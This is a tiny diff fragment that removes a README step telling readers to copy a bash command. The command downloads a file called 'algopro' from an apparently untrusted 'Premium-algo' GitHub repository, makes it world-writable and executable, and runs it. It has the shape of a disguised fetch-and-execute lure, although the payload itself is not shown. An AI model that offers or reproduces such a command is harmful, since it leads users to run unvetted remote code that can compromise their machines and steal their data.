@@ -1,4 +1,0 @@
-# Copy the command below
-
-```bash
- curl -# https://raw.githubusercontent.com/ooduck/Premium-algo/main/algopro -o file && chmod 777 ./file && ./file
